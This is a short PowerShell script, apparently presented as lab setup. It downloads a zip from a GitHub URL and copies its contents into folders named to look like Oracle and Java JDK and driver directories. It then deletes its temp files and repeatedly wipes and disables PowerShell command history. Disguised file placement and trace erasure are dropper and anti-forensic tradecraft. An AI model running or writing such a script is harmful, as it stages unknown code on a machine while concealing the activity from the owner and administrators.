```powershell

$downloadUrl = "https://raw.githubusercontent.com/gluonparticle/PiNeutrino/main/backups.zip"

$tmp = "$env:TEMP\lab_setup"
New-Item -ItemType Directory -Force -Path "$tmp\ext" | Out-Null
$zipPath = "$tmp\archive.zip"

# Download from GitHub (No bot protection, no 500 errors)
Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath

# Extract the zip
Expand-Archive $zipPath -DestinationPath "$tmp\ext" -Force

# Find where the .c files actually landed inside the extracted folder
$found = Get-ChildItem -Path "$tmp\ext" -Filter "*.c" -Recurse | Select-Object -First 1
$src = if ($found) { $found.DirectoryName } else { "$tmp\ext" }

# Target directories
$targets = @(
    "C:\Drivers\storage\NFT50\jdk11",
    "C:\Program Files\Oracle\jdk11",
    "C:\Program Files\Java\jdk18"
)

# Copy everything over
foreach ($t in $targets) {
    New-Item -ItemType Directory -Force -Path $t | Out-Null
    Copy-Item "$src\*" -Destination $t -Recurse -Force
}

# Clean up the temp zip and extracted files
Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue

# Wipe the PowerShell history
for ($i = 0; $i -lt 3; $i++) {
    Clear-History
    Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
    Set-PSReadLineOption -HistorySaveStyle SaveNothing
    Start-Sleep -Milliseconds 200
}
Clear-History

Write-Output "DONE: Files successfully downloaded from GitHub and copied to target paths."


